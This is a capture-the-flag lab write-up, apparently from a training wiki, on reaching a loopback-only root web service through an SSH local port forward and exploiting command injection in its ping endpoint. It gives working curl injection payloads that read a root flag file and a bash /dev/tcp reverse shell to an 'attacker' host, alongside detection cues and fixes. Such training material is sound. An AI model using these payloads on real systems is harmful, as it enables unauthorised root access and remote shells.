# C07 · Station A — local forward (-L) → web RCE · ★★★☆

> **Chapter:** [[Chapter-07-Overview]] · **Next:** [[C07-Station-B-remote-forward-updater]]
> **Host:** `hollow-relay-01` (`target-pivot`) · **Service:** diagnostics web app on `127.0.0.1:8080`, **root**
> **The bug:** a loopback root web service with command injection + a local port forward to reach it.

---

## 1. Exploit — do this first

```bash
# attacker: pull the target's loopback web app to your box
ssh -f -N -L 8080:127.0.0.1:8080 labuser1@target-pivot
curl -G 'http://127.0.0.1:8080/ping' \
  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt'
# ... uid=0(root) ...  R2R{...}
```

Reverse shell instead:

```bash
curl -G 'http://127.0.0.1:8080/ping' \
  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

---

## 2. How you find it

```bash
ss -tlnp                              # 127.0.0.1:8080 — loopback only
# after the -L tunnel is up:
curl http://127.0.0.1:8080/           # a /ping?host= diagnostics endpoint
curl -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1' | head -1
# Running: ping -c1 -W1 127.0.0.1     <- it shows you the shell command it builds
```

## 3. Why it works

`-L 8080:127.0.0.1:8080` forwards `attacker:8080` through the session to
`127.0.0.1:8080` **as seen from the target** — the internal app. That app builds
`"ping -c1 -W1 " + host` and runs it via `/bin/sh` (`shell=True`), which
re-parses metacharacters — so `127.0.0.1; cat …` is two commands. It runs as
root, so your injected command runs as root. The loopback binding was the only
thing protecting it, and `-L` removed it.

## 4. Pitfalls

- **URL-encode the payload** — `curl -G --data-urlencode` handles `;`, spaces, `&`.
- The sink is `sh`, so wrap `/dev/tcp` reverse shells in `bash -c "…"`.
- A shell the request spawns dies with it — copy the flag out or catch a reverse shell.

## 5. Detect & fix

- **Detect:** a web/app process with a `ping`/`sh -c` child; request params with `;` `|` `` ` `` `$(`; services listening as root (`ss -tlnp`, `ps -o user`).
- **Fix:** don't run the service as root; pass argv arrays (`subprocess.run(["ping","-c1",host])`, no `shell=True`); validate `host`. [[Blue-Team-Playbook]].

## 6. What you learned

- Loopback ≠ safe; `-L` reaches it. Then it's an ordinary web bug — same command injection as [[C09-Station-C-Command-Injection]], one tunnel away.

> Next: [[C07-Station-B-remote-forward-updater]] · Related: [[C09-Station-C-Command-Injection]]
